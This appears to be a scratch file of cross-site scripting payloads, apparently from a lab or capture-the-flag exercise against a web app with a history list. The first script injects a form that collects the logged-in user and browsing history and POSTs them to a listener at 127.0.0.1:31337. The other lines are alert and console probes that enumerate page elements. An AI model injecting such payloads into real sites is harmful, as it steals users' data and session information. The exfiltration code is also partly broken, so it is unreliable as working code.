<script>
 form = document.createElement('form');
        form.setAttribute('method', 'POST');
        form.setAttribute('action', 'http://127.0.0.1:31337/');
        myvar = document.createElement('input');
        myvar.setAttribute('name', document.getElementById('logged-in-user'));
        myvar.setAttribute('history', document.getElementById('history-list').innerHTML);
        form.appendChild(myvar);
        document.body.appendChild(form);
        form.submit();

</script>
.getElementsByClassName("row")

<script>alert(document.getElementById('logged-in-user').innerHTML)</script>




<script>console.log(document.getElementsByClassName('list-group').item(0))</script>

<script>alert(document.getElementsByClassName('history-item list-group-item').item(0))</script>
<script>alert(document.getElementsByClassName('history-item.list-group-item').item(0))</script>
<script>alert(document.getElementsByClassName('list-group').item(0))</script>


divChild = document.getElementById("history-list").children[0];

history-item list-group-item

<script>var list= document.getElementsByClassName("history-list");
for (var i = 0; i < list.length; i++) {
    console.log(list[i].id);
}</script>
